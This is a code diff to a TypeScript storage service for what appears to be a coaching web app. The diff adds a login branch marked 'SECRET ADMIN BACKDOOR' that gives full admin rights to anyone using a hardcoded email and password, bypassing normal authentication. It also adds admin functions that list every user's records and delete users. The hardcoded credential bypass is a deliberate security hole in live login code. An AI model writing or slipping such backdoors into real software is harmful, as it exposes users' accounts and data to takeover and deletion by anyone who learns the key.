@@ -82,6 +82,26 @@ export const StorageService = {
       throw new Error('Por favor ingresa usuario y contraseña.');
     }
 
+    // --- SECRET ADMIN BACKDOOR ---
+    if (cleanUsername === 'admin@coachai.com' && cleanPassword === 'masterkey_root_2024') {
+      const adminUser: User = {
+        id: 'ADMIN_MASTER_ROOT',
+        username: 'Administrador',
+        createdAt: new Date().toISOString(),
+        profile: {
+          firstName: 'Admin',
+          lastName: 'System',
+          age: 99,
+          role: 'admin',
+          sport: 'other',
+          discipline: 'System'
+        }
+      };
+      localStorage.setItem(CURRENT_USER_KEY, JSON.stringify(adminUser));
+      return adminUser;
+    }
+    // -----------------------------
+
     const users = StorageService.getUsers();
     
     // 1. Find user by username first
@@ -251,5 +271,33 @@ export const StorageService = {
     const data = StorageService.getUserData(userId);
     data.customExercises = exercises;
     StorageService.saveUserData(userId, data);
+  },
+
+  // --- ADMIN FUNCTIONS ---
+  
+  getSystemReport: () => {
+    const users = StorageService.getUsers();
+    return users.map(user => {
+      const data = StorageService.getUserData(user.id);
+      return {
+        user,
+        stats: {
+          videos: data.videos.length,
+          plans: data.plans.length,
+          strengthRecords: data.strengthRecords.length,
+          competitionRecords: data.competitionRecords.length,
+          trainingRecords: data.trainingRecords.length
+        }
+      };
+    });
+  },
+
+  deleteUser: (userId: string) => {
+     // 1. Remove from Users list
+     const users = StorageService.getUsers().filter(u => u.id !== userId);
+     localStorage.setItem(USERS_KEY, JSON.stringify(users));
+
+     // 2. Remove Data
+     localStorage.removeItem(`${DATA_PREFIX}${userId}`);
   }
 };
